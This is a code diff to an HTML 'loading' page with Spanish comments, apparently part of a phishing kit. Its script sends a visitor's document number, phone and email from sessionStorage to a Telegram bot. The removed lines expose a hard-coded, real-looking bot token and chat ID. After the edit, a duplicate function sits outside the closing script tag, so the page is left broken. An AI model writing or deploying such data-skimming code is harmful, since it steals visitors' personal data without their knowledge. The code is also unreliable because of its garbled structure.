@@ -179,31 +179,32 @@
         </div>
     </div>
 
-   <script>
-    const botToken = "8431946474:AAGwPGma91nER9-mCScFLy3AvOChIZIoa0M"; // 🔹 Reemplaza
-    const chatId = "-4855438579";     // 🔹 Reemplaza
-    
-    let sentMessageId = null; // Guardamos el id del mensaje que vamos a editar
+  <script>
+    const botToken = "TU_BOT_TOKEN"; // 🔹 Reemplaza
+    const chatId = "TU_CHAT_ID";     // 🔹 Reemplaza
+
+    let sentMessageId = sessionStorage.getItem("telegramMessageId") || null;
 
     window.addEventListener("DOMContentLoaded", () => {
-        // 1) Enviar primer mensaje al entrar en loading.html
-        sendTelegramMessage("⏳ Validando información...\nEsperando datos del usuario...");
-        
-        // 2) Si ya hay datos guardados en sessionStorage, actualizar ese mensaje
         const savedData = sessionStorage.getItem("contactData");
         if (savedData) {
             const data = JSON.parse(savedData);
             const message = `
-✅ Datos recibidos:
+⚡ Proceso en curso:
 🪪 Documento: ${data.document}
 📱 Teléfono: ${data.phone}
 📧 Correo: ${data.email}
+
+⏳ Estado: Validando información...
             `;
-            updateTelegramMessage(message);
+            if (sentMessageId) {
+                updateTelegramMessage(message);
+            } else {
+                sendTelegramMessage(message);
+            }
         }
     });
 
-    // Enviar un mensaje nuevo y guardar el id
     function sendTelegramMessage(text) {
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: "POST",
@@ -213,14 +214,36 @@
         .then(res => res.json())
         .then(result => {
             if (result.ok) {
-                sentMessageId = result.result.message_id; // Guardar id del mensaje
+                sentMessageId = result.result.message_id;
+                sessionStorage.setItem("telegramMessageId", sentMessageId);
                 console.log("Mensaje enviado, ID:", sentMessageId);
-            } else {
-                console.error("Error al enviar mensaje:", result);
             }
         })
         .catch(err => console.error("Error Telegram:", err));
     }
+
+    function updateTelegramMessage(newText) {
+        fetch(`https://api.telegram.org/bot${botToken}/editMessageText`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: chatId,
+                message_id: sentMessageId,
+                text: newText
+            })
+        })
+        .then(res => res.json())
+        .then(result => {
+            if (result.ok) {
+                console.log("Mensaje actualizado correctamente (loading.html)");
+            } else {
+                console.error("Error al actualizar mensaje:", result);
+            }
+        })
+        .catch(err => console.error("Error Telegram:", err));
+    }
+</script>
+
 
     // Editar el mensaje existente
     function updateTelegramMessage(newText) {
@@ -313,4 +336,5 @@
     </script>
 </body>
 </html>
+
 
